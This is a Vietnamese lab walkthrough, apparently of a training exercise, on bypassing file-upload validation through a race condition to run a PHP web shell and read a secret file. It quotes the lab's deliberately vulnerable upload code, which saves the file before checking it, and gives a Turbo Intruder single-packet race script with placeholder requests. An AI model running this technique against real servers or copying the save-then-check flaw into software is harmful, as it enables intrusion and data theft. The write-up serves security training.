<img width="1495" height="601" alt="image" src="https://github.com/user-attachments/assets/8962fe7a-6aff-496e-ae5d-dd0deeabeaf9" />

Đây là yêu cầu cho lab này: yêu cầu ta phải đọc được nội dung trong /home/carlos/secret và ta được cung cấp 1 account và ở đây có gợi ý rằng ta vẫn có thể bypass thông qua race codition.

Đầu tiên ta thử đăng nhập bằng account phía sever đã cung cấp.

<img width="2556" height="1443" alt="image" src="https://github.com/user-attachments/assets/eadf6c2b-727d-4607-babe-9408d3a57807" />

Thì ở đây có tính năng update profile thì tôi đã thử với upload 1 hình ảnh lên thì thấy bình thường.

Theo gợi ý của đề bài thì lần này ta có thể bypass qua race codition và ở dưới có đoạn hint code:

    <?php
    $target_dir = "avatars/";
    $target_file = $target_dir . $_FILES["avatar"]["name"];
    
    // temporary move
    move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
    
    if (checkViruses($target_file) && checkFileType($target_file)) {
        echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
    } else {
        unlink($target_file);
        echo "Sorry, there was an error uploading your file.";
        http_response_code(403);
    }
    
    function checkViruses($fileName) {
        // checking for viruses
        ...
    }
    
    function checkFileType($fileName) {
        $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
        if($imageFileType != "jpg" && $imageFileType != "png") {
            echo "Sorry, only JPG & PNG files are allowed\n";
            return false;
        } else {
            return true;
        }
    }
    ?>

Nhìn vào đoạn code này ta thấy được rằng họ đã lưu file trước sau đó mới check xem file có hợp lệ hay không, thì nếu ta upload 1 file webshell lên sau đó truy cập vào file đó ngay sau đó trước khi mà
kịp check file hợp lí thì sao? Liệu có thể bypass được không?

Ở đây, ta không thể khai thác thủ công (ví dụ: mở 2 tab và bấm gửi cùng lúc) vì độ trễ mạng sẽ khiến các gói tin đến đích vào những thời điểm khác nhau. 
Trong khi đó, khoảng thời gian hở ra — tính từ lúc máy chủ tạo, lưu file cho đến khi gọi hàm unlink để xóa — diễn ra cực kỳ nhanh, thường chỉ vỏn vẹn vài mili-giây. Do đó, ta bắt buộc phải sử dụng 
script để đồng bộ hóa các yêu cầu, ép chúng chui lọt qua 'khe cửa hẹp' đó vào gần như cùng một tích tắc.

Ở đây ta dùng extension `Turbo Intruder` để làm điều này, thì ta có đoạn script:

    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
    
        request1 = '''<YOUR-POST-REQUEST>'''
    
        request2 = '''<YOUR-GET-REQUEST>'''
    
        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        engine.queue(request1, gate='race1')
        for x in range(5):
            engine.queue(request2, gate='race1')
    
        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')
    
        engine.complete(timeout=60)
    
    
    def handleResponse(req, interesting):
        table.add(req)

Thì với đoạn code này nó sẽ cung cấp cho Request Engine sức chứa tối đa là 10 kết nối mạng (TCP connections) song song, sau đó là nó dùng gate để chặn byte cuối cùng của request POST lưu vào `race1` 
tiếp đến là cho chạy 5 request GET rồi cũng chặn byte cuối cùng của 5 request rồi cũng lưu vào `race1` rồi khi lưu đủ tất cả request vào `race1` thì nó sẽ openGate cho chạy nốt 6 byte cuối cùng của 
6 request được lưu vào `race1` cùng 1 lúc. Kỹ thuật này (Single-packet attack) ép máy chủ web phải tiếp nhận và xử lý cả 6 yêu cầu hoàn toàn song song, qua đó khai thác thành công khoảng hở (window 
of vulnerability) của lỗ hổng Race Condition.

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/cf659fd8-4717-4d0e-a407-dc715c7de019" />

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/5e9a0cd4-6911-41c2-ac81-f3c0539c7d0b" />

Ở đây có thể thấy ta đã thành công thực thi được câu lệnh php, có nghĩa là ta đã thành công chen vào giữa khoảng thời gian vài mili giây giữa lúc tạo, lưu file và xóa file sau khi kiểm tra file hợp
lệ hay không.

Tiếp đến là lấy nội dung bên trong `/home/carlos/secret`

<img width="952" height="405" alt="image" src="https://github.com/user-attachments/assets/1f1d188d-aebe-452d-9b26-01cd83a586cf" />

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/316a989b-dc28-45db-b34b-be55e20d54bf" />

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/8800d4b6-1998-40b0-8d84-f3eb6a87dcec" />
